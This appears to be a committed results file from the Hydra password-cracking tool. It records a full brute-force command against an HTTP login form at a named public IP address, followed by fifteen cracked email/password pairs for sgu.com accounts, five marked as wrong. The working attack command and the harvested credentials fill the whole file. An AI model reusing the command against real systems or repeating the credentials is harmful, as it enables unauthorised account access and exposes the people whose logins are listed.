@@ -1,0 +1,17 @@
+# Hydra v9.0 run at 2021-03-11 07:20:07 on 103.199.16.65 http-post-form (hydra -L data/users.txt -P data/passwords/filtered-10k-common-pass.txt -o ./data/result-hydra.txt -u -vV 103.199.16.65 http-post-form /index.php?:email_signin=^USER^&password_signin=^PASS^&login='':S=302)
+
+[80][http-post-form] host: 103.199.16.65   login: user60@sgu.com   password: 555555
+[80][http-post-form] host: 103.199.16.65   login: user57@sgu.com   password: donald
+[80][http-post-form] host: 103.199.16.65   login: user59@sgu.com   password: 1q2w3e4r
+[80][http-post-form] host: 103.199.16.65   login: user38@sgu.com   password: azerty
+[80][http-post-form] host: 103.199.16.65   login: user49@sgu.com   password: loveme
+[80][http-post-form] host: 103.199.16.65   login: user64@sgu.com   password: 123qwe
+[80][http-post-form] host: 103.199.16.65   login: user61@sgu.com   password: lovely
+[80][http-post-form] host: 103.199.16.65   login: user42@sgu.com   password: 1qaz2wsx
+[80][http-post-form] host: 103.199.16.65   login: user25@sgu.com   password: sluts - WRONG PASS
+[80][http-post-form] host: 103.199.16.65   login: user48@sgu.com   password: hottie
+[80][http-post-form] host: 103.199.16.65   login: user58@sgu.com   password: montreal - WRONG PASS
+[80][http-post-form] host: 103.199.16.65   login: user44@sgu.com   password: qwertyuiop
+[80][http-post-form] host: 103.199.16.65   login: user86@sgu.com   password: station - WRONG PASS
+[80][http-post-form] host: 103.199.16.65   login: user56@sgu.com   password: madrid - WRONG PASS
+[80][http-post-form] host: 103.199.16.65   login: user93@sgu.com   password: holes - WRONG PASS
